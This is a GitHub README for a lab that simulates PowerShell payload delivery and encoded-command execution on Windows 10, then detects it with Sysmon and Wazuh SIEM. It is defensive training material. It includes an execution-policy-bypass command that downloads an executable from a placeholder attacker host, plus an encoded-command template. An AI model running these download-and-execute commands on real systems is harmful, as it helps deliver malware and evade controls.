# PowerShell Payload & Obfuscation Detection (Sysmon + Wazuh)

## Overview

This project simulates **malware-like behavior using PowerShell**, including payload delivery, encoded command execution (obfuscation), and system modifications on a Windows 10 machine.

The goal is to demonstrate how **Sysmon telemetry combined with Wazuh SIEM** can detect suspicious activity such as file drops, PowerShell abuse, and registry changes.

---

## Tools & Technologies

* Windows 10 (Target machine)
* Sysmon (Endpoint telemetry)
* Wazuh SIEM (Monitoring & detection)
* Kali Linux (Wazuh Manager + Payload host)
* PowerShell (Attack simulation)

---

## Lab Architecture

* Wazuh Manager installed on Kali Linux
* Wazuh Agent installed on Windows 10
* Sysmon configured for process & file monitoring
* Logs forwarded from Windows to Wazuh
* Python HTTP server used for payload delivery

---

## Attack Simulation

### Step 1: Create & Host Payload (Kali Linux)

```bash
mkdir payload_server
cd payload_server
echo "simulation" > payload.exe
python3 -m http.server 8000
```

---

### Step 2: Execute PowerShell command (simulated attack)

Example activity:

* Payload download from remote server
* PowerShell execution
* Encoded command (obfuscation)

Typical commands used:

```
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest http://<KALI_IP>:8000/payload.exe -OutFile C:\Windows\Temp\payload.exe"

powershell -EncodedCommand <base64_payload>
```

---

### Step 3: Suspicious actions generated

* File created in:

  ```
  C:\Windows\SystemTemp\
  ```
* PowerShell temporary script created:

  ```
  C:\Users\Heisenberg\AppData\Local\Temp\__PSScriptPolicyTest_*.ps1
  ```
* PowerShell process execution detected
* Registry key/value changes observed

---

## Detection & Analysis

* Wazuh detected multiple high-severity alerts:

### Key Alerts:

* **Executable file dropped in folder commonly used by malware** (Rule ID: 92213, Level 15)
* **PowerShell created executable in Windows directory** (Rule ID: 92205, Level 9)
* **PowerShell executed encoded command** (Rule ID: 92057, Level 12)
* **Registry Key Entry Deleted / Registry Value Entry Deleted**

### Sysmon Evidence:

* Event ID 11 → File creation
* PowerShell process execution logged
* Suspicious file paths:

  * Temp directory
  * SystemTemp directory

---

## MITRE ATT&CK Mapping

* T1105 – Ingress Tool Transfer
* T1059.001 – PowerShell Execution
* T1027 – Obfuscated/Encoded Commands
* T1070.004 – Indicator Removal (Registry Deletion)

### Tactics:

* Execution
* Command and Control
* Defense Evasion

---

## Alerts Observed

* Encoded PowerShell command execution
* File drop in suspicious directories
* PowerShell creating executable files
* Registry modifications and deletions
* Multiple high-severity alerts (Level 9–15)

---

## Key Learnings

* Detecting PowerShell-based attacks using Wazuh
* Understanding obfuscation techniques (Base64 encoding)
* Monitoring suspicious file creation locations
* Identifying registry changes as defense evasion
* Correlating Sysmon logs with SIEM alerts
* Mapping activity to MITRE ATT&CK framework

---

## Screenshots

* Payload hosting on Kali
* PowerShell execution on Windows
* Sysmon logs (Event ID 11)
* Wazuh alerts (Rule 92213, 92205, 92057)
* MITRE ATT&CK mapping

---

## Author

GitHub: https://github.com/ognenkostov-hub
LinkedIn: https://www.linkedin.com/in/ognen-kostov-42921881
